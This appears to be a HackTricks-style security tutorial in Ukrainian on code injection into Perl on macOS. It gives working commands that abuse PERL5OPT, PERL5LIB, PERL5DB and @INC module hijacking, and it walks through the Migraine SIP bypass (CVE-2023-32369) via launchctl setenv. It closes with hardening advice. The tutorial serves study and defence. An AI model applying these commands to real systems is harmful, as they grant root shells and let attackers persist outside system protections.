# Ін’єкція в Perl Applications у macOS

{{#include ../../../banners/hacktricks-training.md}}

## Через змінні середовища `PERL5OPT` і `PERL5LIB`

За допомогою змінної середовища **`PERL5OPT`** можна змусити **Perl** виконувати довільні команди під час запуску інтерпретатора (навіть **до** розбору першого рядка цільового скрипту).
Наприклад, створіть цей скрипт:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Тепер **експортуйте змінну середовища** та виконайте **perl**-скрипт:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Інший варіант — створити Perl-модуль (наприклад, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
А потім використовуйте змінні середовища, щоб модуль автоматично знаходився та завантажувався:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Інші цікаві environment variables

* **`PERL5DB`** – коли interpreter запускається з прапором **`-d`** (debugger), вміст `PERL5DB` виконується як Perl-код *у* контексті debugger.
Якщо ви можете впливати і на environment, і на flags командного рядка привілейованого Perl-процесу, можна зробити таке:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – у Windows ця variable визначає, який shell executable використовуватиме Perl, коли йому потрібно запустити shell. Згадується тут лише для повноти, оскільки не має значення для macOS.

Хоча `PERL5DB` потребує switch `-d`, часто трапляються maintenance або installer scripts, які виконуються як *root* із увімкненим цим flag для verbose troubleshooting, що робить variable валідним escalation vector.

## Через dependencies (@INC abuse)

Можна переглянути include path, який шукатиме Perl (**`@INC`**), запустивши:
```bash
perl -e 'print join("\n", @INC)'
```
Типовий вивід у macOS 13/14 виглядає так:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Деякі з повернутих папок навіть не існують, однак **`/Library/Perl/5.30`** існує, *не захищена* SIP і розташована *перед* папками, захищеними SIP. Тому, якщо ви можете виконувати запис від імені *root*, ви можете розмістити шкідливий модуль (наприклад, `File/Basename.pm`), який буде *пріоритетно* завантажуватися будь-яким привілейованим скриптом, що імпортує цей модуль.

> [!WARNING]
> Вам усе ще потрібен **root**, щоб виконувати запис у `/Library/Perl`, і macOS покаже запит **TCC** на надання *Full Disk Access* процесу, який виконує операцію запису.

Наприклад, якщо скрипт імпортує **`use File::Basename;`**, можна створити `/Library/Perl/5.30/File/Basename.pm`, що міститиме код під контролем атакувальника.

## Обхід SIP через Migration Assistant (CVE-2023-32369 “Migraine”)

У травні 2023 року Microsoft розкрила інформацію про **CVE-2023-32369**, яку прозвали **Migraine**, — техніку post-exploitation, що дозволяє атакувальнику з правами *root* повністю **обійти System Integrity Protection (SIP)**.
Вразливим компонентом є **`systemmigrationd`** — daemon із entitlement **`com.apple.rootless.install.heritable`**. Будь-який дочірній процес, запущений цим daemon, успадковує entitlement і тому працює **поза** обмеженнями SIP.<sup>[1]</sup>

Серед дочірніх процесів, ідентифікованих дослідниками, є інтерпретатор, підписаний Apple:<sup>[1]</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Оскільки Perl враховує `PERL5OPT` (а Bash — `BASH_ENV`), достатньо отруїти *середовище* демона, щоб отримати довільне виконання в контексті без SIP:<sup>[1][2]</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Коли запускається `migrateLocalKDC`, `/usr/bin/perl` стартує зі шкідливим `PERL5OPT` і виконує `/private/tmp/migraine.sh` *до повторного ввімкнення SIP*. Із цього скрипта можна, наприклад, скопіювати payload до **`/System/Library/LaunchDaemons`** або призначити файлу розширений атрибут `com.apple.rootless`, щоб зробити файл **неможливим для видалення**.

Apple виправила проблему в macOS **Ventura 13.4**, **Monterey 12.6.6** та **Big Sur 11.7.7**, але старі або неоновлені системи залишаються вразливими.<sup>[1]</sup>

## Рекомендації з hardening

1. **Очищайте небезпечні змінні** – привілейовані launchdaemons або cron jobs мають запускатися в чистому середовищі (`launchctl unsetenv PERL5OPT`, `env -i` тощо).
2. **Уникайте запуску інтерпретаторів від імені root**, якщо це не є суворо необхідним. Використовуйте скомпільовані binaries або завчасно скидайте привілеї.
3. **Запускайте vendor scripts із `-T` (taint mode)**, щоб Perl ігнорував `PERL5OPT` та інші небезпечні switches, коли ввімкнено taint checking.
4. **Підтримуйте macOS в актуальному стані** – “Migraine” повністю виправлено в поточних релізах.

## References

- [1] [Microsoft Security Blog – Нова вразливість macOS Migraine може обійти System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
